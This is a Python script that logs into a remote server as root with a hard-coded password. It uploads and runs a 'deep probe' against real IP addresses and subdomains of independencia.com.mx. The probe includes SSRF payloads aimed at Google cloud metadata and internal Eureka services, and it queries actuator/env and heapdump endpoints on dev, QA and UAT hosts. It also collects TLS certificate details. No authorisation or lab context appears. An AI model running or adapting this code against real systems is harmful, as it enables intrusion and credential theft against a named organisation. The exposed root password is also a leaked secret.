import paramiko, sys

vps = '64.177.88.10'
password = '5F.jyTK$D6%.F{a='

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
    ssh.connect(vps, username='root', password=password, timeout=10)
    print('Connected', flush=True)
except Exception as e:
    print(f'SSH Error: {e}')
    sys.exit(1)

SCRIPT = '''
import requests, json, urllib3, ssl, socket, sys
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

def req(url, headers=None, follow=False):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    try:
        r = requests.get(url, headers=h, timeout=8, verify=False, allow_redirects=follow)
        return r.status_code, len(r.text), dict(r.headers), r.text[:500]
    except Exception as e:
        return 0, 0, {}, str(e)

sys.stdout.write("=== DEEP PROBE START ===\\n")
sys.stdout.flush()

# 1. Default response on 8080
code, sz, hdrs, body = req("http://35.188.27.26:8080/")
sys.stdout.write(f"DEFAULT-8080: [{code}] {sz}b body={repr(body[:100])}\\n")
sys.stdout.flush()

# 2. SSRF tests
ssrf_urls = [
    "http://35.188.27.26:8080/?unix:AAAA{}|http://metadata.google.internal/computeMetadata/v1/",
    "http://35.188.27.26:8080/?unix:AAAA{}|http://127.0.0.1:8761/eureka/apps",
    "http://35.188.27.26:8080/?unix:AAAA{}|http://127.0.0.1:8080/actuator/env",
    "http://35.188.27.26:8080/proxy/http://metadata.google.internal/computeMetadata/v1/",
    "http://35.188.27.26:8080/server-status",
    "http://35.188.27.26:8080/server-info",
]
for u in ssrf_urls:
    code, sz, hdrs, body = req(u, {"Metadata-Flavor": "Google"})
    diff = " DIFF!" if sz != 65 else ""
    sys.stdout.write(f"SSRF: [{code}] {sz}b{diff} {u[:70]}\\n")
    if sz != 65 and sz > 0:
        sys.stdout.write(f"  BODY: {repr(body[:200])}\\n")
    sys.stdout.flush()

# 3. Follow 302 on despachos
paths = ["/spei/", "/pocc/", "/certificates/", "/actuator/env", "/heapdump", "/login", "/"]
for p in paths:
    code, sz, hdrs, body = req(f"http://35.188.27.26:80{p}", {"Host": "despachos.independencia.com.mx"})
    loc = hdrs.get("Location", hdrs.get("location", "N/A"))
    sys.stdout.write(f"DESPACHOS: [{code}] {p} -> {loc}\\n")
    sys.stdout.flush()

# 3b. Follow redirect fully
code, sz, hdrs, body = req("http://35.188.27.26:80/", {"Host": "despachos.independencia.com.mx"}, follow=True)
sys.stdout.write(f"DESPACHOS-FOLLOW: [{code}] {sz}b body={repr(body[:300])}\\n")
sys.stdout.flush()

# 4. Eureka
eureka_targets = [
    "http://35.225.39.206:80/",
    "http://35.225.39.206:80/eureka/apps",
    "https://35.225.39.206:443/",
    "https://35.225.39.206:443/eureka/apps",
    "http://35.225.39.206:8761/",
    "http://35.225.39.206:8761/eureka/apps",
]
for u in eureka_targets:
    code, sz, hdrs, body = req(u, {"Host": "eureka.independencia.com.mx", "Accept": "application/json"})
    hit = " HIT!" if code == 200 and sz > 100 else ""
    sys.stdout.write(f"EUREKA: [{code}] {sz}b{hit} {u}\\n")
    if hit:
        sys.stdout.write(f"  BODY: {repr(body[:400])}\\n")
    sys.stdout.flush()

# 5. Dev
dev_targets = [
    "http://34.68.215.6:80/",
    "http://34.68.215.6:80/actuator/env",
    "http://34.68.215.6:80/actuator/health",
    "http://34.68.215.6:80/swagger-ui/",
    "https://34.68.215.6:443/",
    "https://34.68.215.6:443/actuator/env",
]
for u in dev_targets:
    code, sz, hdrs, body = req(u, {"Host": "desarrollo.independencia.com.mx"})
    hit = " HIT!" if code == 200 and sz > 100 else ""
    sys.stdout.write(f"DEV: [{code}] {sz}b{hit} {u}\\n")
    if hit:
        sys.stdout.write(f"  BODY: {repr(body[:400])}\\n")
    sys.stdout.flush()

# 6. SIF
sif_targets = [
    "http://34.72.38.129:80/",
    "http://34.72.38.129:80/actuator/env",
    "http://34.72.38.129:80/actuator/health",
    "https://34.72.38.129:443/",
    "https://34.72.38.129:443/actuator/env",
]
for u in sif_targets:
    code, sz, hdrs, body = req(u, {"Host": "sif.independencia.com.mx"})
    hit = " HIT!" if code == 200 and sz > 100 else ""
    sys.stdout.write(f"SIF: [{code}] {sz}b{hit} {u}\\n")
    if hit:
        sys.stdout.write(f"  BODY: {repr(body[:400])}\\n")
    sys.stdout.flush()

# 7. UAT/DEV Aheeva
aheeva_targets = [
    "http://34.121.92.79:8484/",
    "http://34.121.92.79:8484/actuator/env",
    "http://34.121.26.148:8484/",
    "http://34.121.26.148:8484/actuator/env",
    "https://34.102.167.192:9443/",
    "https://34.102.167.192:9443/actuator/env",
]
for u in aheeva_targets:
    code, sz, hdrs, body = req(u)
    hit = " HIT!" if code in (200,302,401,403) and sz > 0 else ""
    sys.stdout.write(f"AHEEVA: [{code}] {sz}b{hit} {u}\\n")
    if hit and sz > 0:
        sys.stdout.write(f"  BODY: {repr(body[:200])}\\n")
    sys.stdout.flush()

# 8. QA
qa_targets = [
    "http://34.70.22.48:80/",
    "http://34.70.22.48:80/actuator/env",
    "http://34.70.22.48:80/actuator/health",
    "https://34.70.22.48:443/",
]
for u in qa_targets:
    code, sz, hdrs, body = req(u, {"Host": "bqqa.independencia.com.mx"})
    hit = " HIT!" if code == 200 and sz > 100 else ""
    sys.stdout.write(f"QA: [{code}] {sz}b{hit} {u}\\n")
    if hit:
        sys.stdout.write(f"  BODY: {repr(body[:400])}\\n")
    sys.stdout.flush()

# 9. SSL cert subjects
sys.stdout.write("\\n=== SSL CERTS ===\\n")
for ip, port, name in [
    ("35.188.27.26", 443, "bigdatainfo"),
    ("35.225.39.206", 443, "eureka"),
    ("34.68.215.6", 443, "desarrollo"),
    ("34.72.38.129", 443, "sif"),
    ("34.70.22.48", 443, "bqqa"),
    ("34.121.92.79", 443, "aheevauat"),
    ("34.102.167.192", 443, "aheevaqa"),
]:
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with ctx.wrap_socket(socket.socket(), server_hostname=f"{name}.independencia.com.mx") as s:
            s.settimeout(5)
            s.connect((ip, port))
            cert = s.getpeercert()
            subj = dict(x[0] for x in cert.get("subject", []))
            issuer = dict(x[0] for x in cert.get("issuer", []))
            san = [v for _, v in cert.get("subjectAltName", [])[:3]]
            sys.stdout.write(f"  {name}: CN={subj.get('commonName','?')} Issuer={issuer.get('organizationName','?')} SAN={san}\\n")
    except Exception as e:
        sys.stdout.write(f"  {name}: ERR {e}\\n")
    sys.stdout.flush()

sys.stdout.write("\\n=== DEEP PROBE DONE ===\\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/deep_probe2.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Script uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/deep_probe2.py 2>&1', timeout=600)
out = stdout.read().decode(errors='replace')
err = stderr.read().decode(errors='replace')
print(out, flush=True)
if err:
    print('STDERR:', err, flush=True)
ssh.close()
print('Done.', flush=True)
